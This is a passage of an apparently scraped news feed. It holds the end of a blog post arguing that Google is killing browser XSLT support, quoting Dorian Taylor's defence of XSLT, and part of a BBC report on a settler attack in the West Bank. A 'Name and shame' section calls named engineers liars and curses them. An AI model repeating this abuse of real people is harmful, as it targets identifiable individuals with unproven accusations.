for example, <a href="https://mastodon.social/@aslakr/115015511759324306">I have recently discovered</a>
thanks to <a href="https://mastodon.social/@aslakr">@aslakr​@mastodon.social</a>,
that WordPress provides a default XSLT stylesheet for its sitemaps
(curiously, apparently not one for its web feeds, though?)</p>

<p>And that's just the beginning: <a href="https://wok.oblomov.eu/tecnologia/sparkling-wok-4/">as I've shown on this same site</a>,
it's possible to use XSLT <a href="https://wok.oblomov.eu/tecnologia/plotting-xslt/">to plot XML data</a>,
and in general to produce rich, complex documents <em>without JavaScript</em>,
and again with potentially significant reductions in hosting and bandwidth costs.</p>

<p>Bonus points: <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3161446202">it seems</a> that the horde of LLM scrapers that are causing troubles all around
have some difficulties with general XML, so switching to XML+XSLT could actually work for self-protection.</p>

<p>Remember <a href="#amp">AMP</a>?
If you really wanted to keep shipping the usual tons of useless crap on desktop, but not on mobile,
you could put the actual content in an XML file,
and then provide two separate, trivial XSLT stylesheets,
one to transform it into the usual bloated desktop page,
and one to transform it into the stripped-down (and less bloated) abomination that is AMP HTML
—which would have come in handy when Google introduced the requirement that the AMP and standard page
had to present the same content.
But then again, why even ship those tons of useless crap on desktop in the first place?</p>

<p>And to be honest, <a href="https://web.dev/articles/webcomponents-template" title="HTML's New Template Tag">HTML templates</a> look thoroughly unimpressive compared to XSLT.</p>

<h3 id="dorian"><a name="index1h3"></a>Dorian Taylor on XSLT</h3>

<p>If you've read this far, I would encourage you to also read
<a href="https://github.com/whatwg/html/issues/11523#issuecomment-3160242434">the passionate defense of XSLT by Dorian Taylor</a>
on the Github issues that Google is using as an excuse to kill the standard.
In case GAFAM gets touchy and decides to purge it,
I'm taking the liberty to reproduce it here for archival purposes:</p>

<blockquote>
  <p>I have been using XSLT since it was in beta and the only browser that implemented it was MSIE 5.5.
  I designed and implemented an internationalized content pipeline using XSLT and DocBook at the job I had from 2002-2005.
  Since about 2007 I've been using XSLT regularly on the client side to transform (X)HTML into itself (as well as SVG and Atom),
  because it excels at bolting presentation markup onto plain semantic markup,
  and thus makes for an extremely lazy templating language that exists separately from the JavaScript ecosystem.
  I use it on <a href="https://doriantaylor.com/">my own</a> <a href="https://the.natureof.software/">Web properties</a>,
  and I use it on projects (I mainly do intranets).
  I have made libraries <a href="https://github.com/doriantaylor/xslt-transclusion">for seamless transclusion</a>
  and <a href="https://github.com/doriantaylor/xslt-rdfa">querying RDFa</a>, and I use those on projects
  (like <a href="https://senseatlas.net/">Sense Atlas</a>, a nascent
  knowledge graph product I'm working on, and <a href="https://intertwingler.net/">Intertwingler</a>, the application
  server that powers it).</p>
  
  <p>Why I still use XSLT:</p>
  
  <ul>
  <li>it's a standard</li>
  <li>it's fast (at least nominally)</li>
  <li>it's declarative</li>
  <li>it's orthogonal to JS</li>
  <li>it can mix any number of back-ends (because it's a standard and operates over standard inputs;
  I regularly use it to mix static and dynamic resources on the same page)</li>
  <li>it can only operate over information you give it (modulo zero-days, apparently)</li>
  <li>it operates over wholes, i.e., it doesn't stitch together markup as text but rather operates over intact DOM structures.</li>
  </ul>
  
  <p>The first and last points are probably the biggest reasons I still use it, and I suppose the latter may need some unpacking.
  An XSLT stylesheet is a well-formed XML document and only operates over well-formed XML documents,
  and (unless you put in the effort) is only capable of producing well-formed (X|HT)ML documents.
  So you have a validity check baked in at a very low level.
  Every other templating language I've seen, going all the way back to server-side includes (<a href="http://clearsilver.net/">with one esoteric exception</a>),
  seems to not be shy about chopping up the syntax of the target language.</p>
  
  <p>I anticipate the knee-jerk reaction to this is "so what?".
  Why should you care whether your template language breaks the syntax of the target?
  The tooling can compensate and it's intact when you render it. I mean, I guess?
  But then you need more tooling when otherwise an off-the-shelf validator would do.
  But that I think is not even the main differentiator.</p>
  
  <p>The key difference, and why I've stuck with XSLT for almost 25 years, is cognitive.
  When I make a hypermedia resource (I am deliberately not using the word "page"),
  I think about it as a discrete, atomic whole.
  I can consider that object (and the server-side code that generates it) in isolation.
  It loads in the browser and is well-formed and intact and navigable.
  Then I can think about applying transformations to that object,
  and/or composing related objects together, as a separate act.
  When I write an XSLT template, I think about it like a function (in the mathematical sense) rather than a procedure.
  I see my job as not to stitch together fragments of markup but to describe the node tree that results from an input tree.
  When I look at so-called "modern" frameworks, I (still) don't see any of that.</p>
  
  <p>The reason why the implementations are riddled with CVEs, in my opinion, is because of neglect.
  I am old enough to remember when HTML5 was competing with XHTML2✱ as the proposed next-generation HTML standard.
  It turned out that the pedantry of the XML parser was not only reviled by developers
  (and remains a source of confusion for users if they hit a bad patch of it),
  for markup it was actually unnecessary.
  Tastes changed, and people moved on.
  The browser vendors keep the parsers around, but they demonstrably put as little effort into them as they can get away with.
  (The biggest shortcomings of XSLT 1.0 were fixed in 2.0—in 2007—but of course the browsers never implemented it.)</p>
  
  <blockquote>
    <p>✱ XHTML2 actually had some really good ideas (like transclude all the things),
    but its mission (something like "how do we make the best XML-based hypertext markup language") was ultimately wrong-headed.
    I am also old enough to remember, however, that one of the central arguments for HTML5
    (now just "HTML", of course) was not breaking backward-compatibility.</p>
  </blockquote>
  
  <p>My proposal, then, is not to scrap XSLT, but to rehabilitate it.
  When it first shipped, XSLT was a solid, open-standard solution to the bog-standard problem of generating presentation markup.
  How many times has the wheel of Web templating been reinvented for this framework or that?
  Where is the Open Web successor to XSLT? How about…XSLT?</p>
  
  <p>At its core, XSLT is terrifically powerful, especially <a href="https://www.w3.org/TR/xslt-30/">its latest incarnation</a>
  (which, incidentally, <a href="https://www.w3.org/TR/xslt-30/#json">can operate over JSON</a>). There are, of course, challenges:</p>
  
  <ol>
  <li>I would say problem number one is the syntax. XSLT is an extremely bulky, chatty language.
  Without syntax completion in your code editor you'd never get anything done.
  But, there are precedents for ameliorating this,
  like <a href="https://relaxng.org/compact-tutorial-20030326.html">the compact syntax for RelaxNG</a>,
  or the <a href="https://www.w3.org/TR/turtle/">Turtle</a> or <a href="https://www.w3.org/TR/json-ld11/">JSON-LD</a> syntaxes for RDF.</li>
  <li>XSLT only operates over XML (except of course for 3.0 which made an accommodation for JSON).
  Well that's simple, bump XSLT to 3.1 and spec out how it should operate over HTML DOMs (case-insensitive tags, whatever),
  as well as an invocation hook analogous to the XSLT processing instruction.</li>
  <li>Namespaces: Apparently people hate them?
  This is something I have never understood (because if you don't use namespaces you just end up reinventing them badly), but whatever, fine.
  You won't need namespaces in your XPath anyway if you're just transforming HTML.</li>
  <li>XPath: I would actually put money on the likelihood that CSS selector semantics can embed fully into XPath,
  especially given that XPath 3.1 itself is extensible (worst case scenario is you cheat and just make a <code>css</code> function).</li>
  <li>Debugging: currently sucks. This I would chalk up to the same neglect as the CVEs.</li>
  </ol>
  
  <p>It would be eminently feasible to make a "<em>SWeT</em>", Standard Web Templates:</p>
  
  <ul>
  <li>easy, neat, declarative syntax, comparable to Sass or RNC (<a href="https://doriantaylor.com/file/xslt-mockup">I sketched one out in like 2019</a>)</li>
  <li>isomorphic (or at least injective onto) XSLT 3.0 (3.1?); compiles to it</li>
  <li>wouldn't have to touch namespaces or even XPath if you didn't want to (use CSS selectors instead)</li>
  <li>still capable of existing outside of the JS ecosystem, but can be accessed from JS/DOM just like XSLT 1.0 can</li>
  </ul>
  
  <p>Now I can imagine somebody saying well I can go off and do that anyway;
  <a href="https://www.saxonica.com/saxonjs/index.xml">there's a reference implementation</a> of XSLT 3.0 I can compile against (written, actually, by the spec's author), etc etc. I think
  that kind of misses the point of having a <em>standard</em> templating language that you can rely on being baked into every Web browser.
  At least, I suppose, until they rip it out.</p>
  
  <p>So I guess my ultimate question is, is there truly no appetite for a standard language for transforming markup,
  a thing we all have to do, on every project, all the time?
  A thing that for lack of a standard, locks us into this or that framework,
  or stymies <a href="https://doriantaylor.com/intelligent-heterogeneity">casual system heterogeneity</a>?
  A thing that would make it even easier to build the Web? Seems like a sensible idea, doesn't it?</p>
</blockquote>

<p>(Again: <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3160242434">source, for reference</a>.)</p>

<p>And now, onwards to what's ahead.</p>

<h2 id="whatwecandoaboutit"><a name="index4h2"></a>What we can do about it</h2>

<h3 id="makeyourselfbeseen"><a name="index2h3"></a>Make yourself be seen</h3>

<p>The first step is to actually use XML and XSLT. Visit sites that use them.
If you have your own website, seek out opportunities to rely on this tech.
If you don't know how, there's <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3161446202">apparently</a> a growing number of tutorials around,
both in text and video form. Stealing the links to the text tutorials from the above link,
we have for example.</p>

<ul>
<li><a href="https://ricardolopes.net/blog/styling-rss/">Styling Your RSS For a Better Web</a></li>
<li><a href="https://hacdias.com/2024/10/23/styled-rss-feeds/">Styling My RSS Feed</a></li>
<li><a href="https://dev.to/natclark/styling-an-rss-feed-with-xslt-jp3">Styling an RSS Feed With XSLT</a></li>
<li><a href="https://darekkay.com/blog/rss-styling/">Style your RSS feed</a></li>
</ul>

<p>(notice a pattern there?)</p>

<p>And styling RSS is just the most common use-case of XSLT.
You can use it to <a href="https://wok.oblomov.eu/tecnologia/plotting-xslt/">plot data</a> and <a href="https://wok.oblomov.eu/tecnologia/plotting-sparklines-xslt/">create sparklines</a>,
like I've done.
You can use it <a href="https://wok.oblomov.eu/tecnologia/uberprufungslisten/">in place of server-side includes</a>.
You can use it to render tabular data you have in XML form.
You can use it <a href="https://gts.skobk.in/@tennoseremel/statuses/01K317WWPS020K8XYSNNCSWHM3">to adjust the (X)HTML structure of your documents</a>
to <a href="https://wok.oblomov.eu/tecnologia/web/css-challenges/">compensate for CSS limitations</a>.</p>

<p>By the way, if you can find new and interesting applications of XSLT in browsers, do let me (and the world) know
(see bottom of this article for information about how to contact me on the Fediverse).</p>

<h3 id="makeyourselfbeheard"><a name="index3h3"></a>Make yourself be heard</h3>

<p>Complain. Complain. Complain.
Comment on every relevant issue. Vote against the issue in the issue trackers.
Let the browser developers know you are affected.</p>

<p>If (or when) the changes still pass, open new tickets.
<em>Demand</em> that XSLT support be reinstated. And while you're at it, <em>demand</em> that it get upgraded to XSLT 3.0 at least.
And <em>demand</em> that it be enabled for plain HTML.</p>

<p>Voice your opinion on social media. Post about it. Tag the social media profiles of the WHATWG,
of  Google, Apple, Mozilla, Microsoft,
of Chrome, Safari, Firefox, Edge, and let them know that such a change will not be accepted.</p>

<p>Do not let the lies prevail.
The choice to suppress XSLT is not due to technical reasons, and it's not due to lack of resources.
It's entirely a policy choice intended to obstruct and limit the expressivity of the open and indie web,
and this needs to be remarked to anyone believing otherwise.</p>

<h3 id="buildthealternative"><a name="index4h3"></a>Build the alternative</h3>

<p>If (or when) the changes pass, our best option is to push through with a polyfill like the <a href="https://www.saxonica.com/saxonjs/index.xml">SaxonJS</a>
<span>mentioned by Dorian Taylor|</span>.
It will not be as efficient as a native implementation, it will not be as fast,
andit will not be enough to allow clients to open and visualize XML files directly,
but it <em>will</em> allow us to build the case for a return to XSLT as a significant web technology,
and become an important instrument in pressuring vendors for new native implementations,
not unlike how <a href="http://en.wikipedia.org/wiki/MathJax">MathJax</a> has been a useful bridge to native implementations of <a href="http://en.wikipedia.org/wiki/MathML">MathML</a>.</p>

<p>For pure XML files&nbsp;… maybe an <a name="extensions">extension</a>? This is most likely possible for Firefox,
but I don't know enough about the <a href="#mv3">more restrictive rules implemented in Chrome</a> to tell if it would be possible or not.
But of course, even if such an extension was possible today,
there is no guarantee that Chrome won't push for <em>another</em> change in the API
to disable it, like it did with ad&nbsp;blockers.</p>

<p>Who knows, it might as well be that the <a href="http://en.wikipedia.org/wiki/Streisand%20effect">Streisand effect</a> on this umpteenth attempt by Google to kill XSLT
will be the chance for its rebirth.</p>

<h2 id="afterword"><a name="index5h2"></a>Afterword</h2>

<p>With as much I hate Microsoft, its anticompetitive practices,
and the way their Wintel monopoly has stymied software and hardware development,
killed companies and destroyed innovation in the desktop and workstation space,
<em>one</em> thing I can say about the <a href="http://en.wikipedia.org/wiki/First%20browser%20war">First browser war</a> is that
—at least while it was ongoing— it led to a lot of innovation in the web space.
Microsoft were the first to implement client-side XSLT,
they were the ones that opened the gateway to <a href="http://en.wikipedia.org/wiki/AJAX">AJAX</a>
through their proprietary XMLHTTP <a href="http://en.wikipedia.org/wiki/ActiveX">ActiveX</a> control that
was reimplemented into other browsers as the <a href="http://en.wikipedia.org/wiki/XMLHttpRequest">XMLHttpRequest</a> object,
and they were the ones that tried to add SMIL to (X)HTML through the <a href="http://en.wikipedia.org/wiki/HTML%2BTIME">TIME</a> extension,
which I wish hadn't failed the way it did
(we would have to wait nearly another decade before a limited subset of the functionality would finally get into HTML via <a href="http://en.wikipedia.org/wiki/CSS%20animations">CSS animations</a>).</p>

<p>It's possible that this is was at least in part due to the fact that,
as it has been said, Microsoft didn't “get” the Internet,
but I suspect that the primary reason was that there was some actual competition going on
—competition that since the creation of the WHATWG has been replaced by what is,
for all intents and purposes, a <em>cartel</em>.</p>

<p>The intent to bypass the W3C for some decisions <em>did</em> have some merit at the time of creation;
looking at the <a href="https://www.w3.org/2004/04/webapps-cdf-ws/papers/opera.html" title="Position Paper for the W3C Workshop on Web Applications and Compound Documents">the document</a> whose rejection led to the creation of the WHATWG,
for example, we see among the design principles:</p>

<blockquote>
<dl>
<dt>Well-defined error handling</dt>
<dd>Error handling in Web applications must be defined to a level of detail where User Agents do not have to invent their own error handling mechanisms
or reverse engineer other User Agents'.</dd>
<dt>Users should not be exposed to authoring errors</dt>
<dd>Specifications must specify exact error recovery behaviour for each possible error scenario.
Error handling should for the most part be defined in terms of graceful error recovery (as in CSS),
rather than obvious and catastrophic failure (as in XML).</dd>
</dl>
</blockquote>

<p>which I can't disagree with.
On the other hand,
it's also clear that two other design principles,
<em>backwards compatibility</em> and <em>open process</em>,
have been consistently violated since
<a href="https://wok.oblomov.eu/tecnologia/opera-requiem-2/">Opera dropped out</a>
(oh, how prescient I was in that article!)
and the WHATWG was taken over by Google and its lapdogs (Mozilla)
and frenemies (Microsoft and Apple).</p>

<p>Today, I'm left wondering if the developers of browsers like
<a href="http://en.wikipedia.org/wiki/Servo%20%28software%29">Servo</a>
—<a href="https://servo.org/">the engine</a> born out of the Mozilla experiments
that were cut out (with the entire development team fired)
at the start of the <a href="http://en.wikipedia.org/wiki/COVID%2D19%20pandemic">COVID-19 pandemic</a>—
or
<a href="http://en.wikipedia.org/wiki/Pale%20Moon">Pale Moon</a> would even be accepted into the WHATWG today,
since they could
(and <a href="https://outerheaven.club/objects/ce85bc54-449d-43a6-8bea-022cdbb2b457">at the least the latter would</a>)
happily throw a wrench into the whole
“fake public feedback” mockery we've been subject to this time.</p>

<h2 id="nameandshame"><a name="index6h2"></a>Name and shame</h2>

<p>The engineers working on these proposals should be ashamed of themselves.
The names I could gather from the public discussions are:</p>

<ul>
<li>Adam Barth was
<a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/zIg2KC7PyH0/m/Ho1tm5mo7qAJ">the engineer who proposed to remove XSLT in 2013</a>,
with support from Eric Seidel, Ojan Vafai;</li>
<li>Philip Rogers and Eric Willigers were
<a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/5o0yiO440LM/m/59rZqirUQNwJ">the engineers who proposed to remove SMIL in 2015</a>,
with support from Chris Harrelson, Dimitri Glazkov, Philip Jägenstedt;</li>
<li>Ryan Sleevi was
<a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/pX5NbX0Xack/m/kmHsyMGJZAMJ">the engineer who proposed to remove <code>keygen</code> in 2015</a>;</li>
<li>Ben Wiser, Borbala Benko, Philipp Pfeiffenberger, Sergey Kataev were
<a href="https://github.com/explainers-by-googlers/Web-Environment-Integrity/blob/main/explainer.md">the engineers who proposed the Web Environment Integrity</a>;</li>
<li>Mason Freed is
<a href="https://github.com/whatwg/html/issues/11523">the engineer pushing the XSLT removal in 2025</a>,
with support from Anne van Kesteren,
the Mozilla employee that appropriately goes by the moniker <code>smaug</code>,
Tab Atkins Jr., Domenic Denicola.</li>
</ul>

<p>If you ever hear any of these blabber about open web, interoperability and standards,
know that they are lying through their teeth.</p>

<p>And if any of you happen to read this: fuck you.</p>

<h2 id="madethenews"><a name="index7h2"></a>Made the news</h2>

<p>I've apparently “made the news”.</p>

<ul>
<li><p><a href="https://www.osnews.com/">OSNews</a> has <a href="https://www.osnews.com/story/143123/google-is-killing-the-open-web/">an article</a> that provides a very nice, short, on-point summary;</p></li>
<li><p><a href="https://news.ycombinator.com/">Hacker News</a> has <a href="https://news.ycombinator.com/item?id=44949857">a thread</a>.</p></li>
</ul>

<p>I have read the comments
(yes, I know, you should never do that)
and it's curious that those that didn't like or agree with the article can be grouped in three sets:</p>

<dl>
<dt>unconvinced by my timeline</dt>
<dd>these are commenters that disagree on my list being enough to prove that Google is out to destroy the open web;
that's OK, the list isn't there to prove anything, it's just to remind people
(or inform youngsters who might not remember those days)
about some relevant (and a couple less relevant) events in the last decade-plus that have significantly shaped the web;
the list isn't even exaustive insofar Google is concerned,
let alone all the crap, failed promises, rug pulls and abuses committed by the rest of the <a href="http://en.wikipedia.org/wiki/GAFAM">GAFAM</a> crowd
—the only reason I'm singling out Google here, and on those events in particular, is because the focus is on XML, XSLT,
and the WHATWG takeover and unwillingness to listen to what users have to say;</dd>
<dt>disagreement on the assessment</dt>
<dd>these are people who disagree on some of the events I reported being bad for the open web,
or aimed at encircling it; so far, from what I see, these comments come from Googlers or ex-Googlers;
well, I'm sorry to burst your bubble; I'm sure the engineers working at Google
have always had the conviction to be doing Good Stuff™ for the benefits of all;
but see, that's kind of the problem of a lot of Big Tech employees:
the lack of attention to the <em>implications</em> of what their brilliant ideas are going to be used for
—and sometimes, possibly, even the time to stop and think if the “innovation”
is even needed in the first place, or you're forgetting what older, well-established but less reknown tech can already do;</dd>
<dt>people that don't like XML</dt>
<dd><strong>you're missing the point</strong>; this isn't about whether XML is nice or not,
it's about the fact that it exists, it's in use, and it's a powerful tool that web developers can and <em>do</em> use;
you prefer <a href="https://wok.oblomov.eu/tag/JSON/" rel="tag">JSON</a> to <a href="https://wok.oblomov.eu/tag/XML/" rel="tag">XML</a>? <em>That's fine</em>, and if anything that's one more reason to push
browser developers to implement newer XSLT versions that <em><a href="https://www.w3.org/TR/xpath-31/">support JSON too</a></em>;
or if you prefer: the question isn't whether or not XML and XSLT are worth saving;
<strong>it's whether or not you want Google to define what is allowed on the World Wide Web</strong>.
</dd>
</dl>

<p>By the way, you can let me know directly about your thoughts about this article by
<a href="https://sociale.network/@oblomov/115044789276014433">commenting on this Fediverse thread</a>.</p>

</section>



</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[BBC witnesses settlers attack on Palestinian farm in West Bank (115 pts)]]></title>
            <link>https://www.bbc.com/news/articles/cewy88jle0eo</link>
            <guid>44949264</guid>
            <pubDate>Tue, 19 Aug 2025 07:50:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.com/news/articles/cewy88jle0eo">https://www.bbc.com/news/articles/cewy88jle0eo</a>, See on <a href="https://news.ycombinator.com/item?id=44949264">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><div data-testid="byline-new" data-component="byline-block"><p><span>Lucy Williamson</span></p><p><span>BBC News, Der Abu Falah, in the occupied West Bank</span></p></div><p data-component="caption-block"><figcaption>The BBC's Lucy Williamson witnessed an attack by masked settlers</figcaption></p><div data-component="text-block"><p>From among the broken remains of Brahim Hamaiel's olive trees, in the occupied West Bank, we saw the masked men approach.</p><p>A dozen settlers, charging down from the illegal outpost above his farm and across the field towards us, moving fast and carrying large sticks.</p><p>A sudden and unprovoked attack.</p><p>Brahim had been showing us the trees he said had been hacked to pieces this week by settlers from the outpost.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp" loading="eager" alt="Fred Scott/BBC Several masked men run down a dry hill carrying various weapons"><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Masked settlers ran into the Palestinian farmland</figcaption></p></figure><div data-component="text-block"><p>His family have farmed olives here on land near Turmus Aya, for generations, making it a target for extremist settlers who think killing Palestinian trees and livestock will also kill the idea of a Palestinian State, by forcing residents like Brahim off their land.</p><p>"Fear is natural," Brahim had told me, looking up at the ridge where tarpaulin flapped at the settlers' lookout post in front of a few caravans and makeshift homes.  "But there's something stronger than fear that drives me to stay here – the scent of my ancestors and an attachment dating back hundreds of years – even if I pay the price with my blood."</p><p>As the masked men run towards us, we pull back to the road and drive a safe distance away.</p><p>Within minutes, some of Brahim's neighbours from the surrounding farms and villages gather with catapults and stones to confront the attackers.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/c0a1/live/8c5e9300-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp" loading="lazy" alt="Fred Scott/BBC Brahim Hamaiel stands next to a cut down olive tree in the West Bank. He wears a blue shirt and jeans in a dry field with mountains on the horizon. "><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Brahim Hamaiel stands next to the broken remains of his olive trees</figcaption></p></figure><div data-component="text-block"><p>Vegetation by the side of the road is set on fire, its smoke signalling the site of the confrontation, as settlers on a quad bike chase away a volunteer emergency crew trying to reach a farmhouse in the middle of the field.</p><ul><li><a target="_self" href="https://www.bbc.co.uk/news/articles/cyv3rl9prp6o">'Stop shooting! My daughter is dead': Woman killed as West Bank power struggle rages</a></li></ul><p>This is now a familiar routine. Palestinians living in these villages south of Nablus say there are attacks and confrontations on their lands every week, and that settlers are using these kinds of tactics to take over the land, field by field.</p><p>But the speed and spread of this attack is breathtaking.</p><p>In little more than an hour, dozens of settlers had fanned out across the hills.  We watched as they broke into an isolated building, and methodically set fire to vehicles and homes.</p><p>Shepherds on the furthest ridge rushed their flocks away, as the hillside behind them broke into flames, smoke billowing up from several places.</p><p>By then, Palestinians arriving from across the area to help their neighbours found the main access road blocked by the Israeli army, as the destruction continued.</p><p>One Palestinian was reportedly beaten by settlers, and the army later told us that both sides had hurled rocks at each other, and that Palestinians had burned tyres.  It said four Israeli civilians received medical treatment at the scene.</p><p>Among the crowd waiting near the army roadblock, we found Rifa Said Hamail, her frantic gestures giving way to a warm smile and embrace when we spoke to her.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/c6d4/live/41def5d0-7c0f-11f0-a34f-318be3fb0481.jpg.webp" loading="lazy" alt="Fred Scott/BBC A large expanse of land with cars dotted across. Dark smoke billows up towards the sky in the right hand corner where a fire rages on. "><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Israeli settlers set fire to vehicles and homes</figcaption></p></figure><div data-component="text-block"><p>Rifa told us her husband was trapped in their farmhouse near Brahim's olive farm, and surrounded by settlers, but that the army wouldn't let her pass.</p><p>"Every other day the settlers do this to us – they attack us, cut down the olive trees, and burn the farms," she said.  "This is not a life. No one can stop them. We have nothing to resist them with. They have weapons, we have nothing."</p><p>We later learned that settlers had torched part of their property, and that Rifa's husband had been left with cuts to his face and leg, after being hit with rocks.</p><p>The Israeli organisation Peace Now, which monitors the spread of settlements in the West Bank, says the number of outposts – and settler aggression – has multiplied since the Hamas attacks on Israel in October 2023, and the Gaza War that followed.</p><ul><li><a target="_self" href="https://www.bbc.co.uk/news/articles/c20gnvz1975o">Palestinian olive harvest under threat from Israeli attacks and restrictions</a></li></ul><p>Since the beginning of last year, it says, some 100 outposts have appeared across the West Bank.  It also found that hundreds of square kilometres of land had been taken over by settlers in the past few years using the same violent pattern of intimidation – encouraged, it says, by government support and a lack of proper law enforcement by Israel.</p><p>Last week, Israel's far-right Finance Minister, Bezalel Smotrich, announced the creation of thousands of new housing units in a large West Bank settlement bloc further south, saying it would "bury the idea of a Palestinian state".</p><p>Between 5-11 August, the UN Office for Humanitarian Affairs documented at least 27 settler attacks against Palestinians that resulted in casualties, property damage or both, across two dozen different communities.  These attacks, it said, led to the displacement of 18 households.</p><p>We weren't able to speak to any of the settlers involved in the attack we witnessed.  The local settlers' council told us there were elements on both sides seeking provocation, which it strongly condemned.</p><p>Brahim told us he had filed two separate complaints about the attacks on his land, but few Palestinians here have much faith in Israeli justice or security forces, saying repeatedly that they protect only the settlers.</p><p>One of the volunteer emergency crews who came to help during the clashes on Saturday told me the Israeli army had prevented them from reaching the scene.</p><p>"We were trying to rescue the young men, when the army came, honking at us and telling us to get away from here," Yahya al-Khatib said. </p><p>"We were volunteers wearing our vests. We're not here to attack or harm settlers. We want to put out fires and treat injured people. But they [the army] stop us and stand in our way."</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp 1536w" 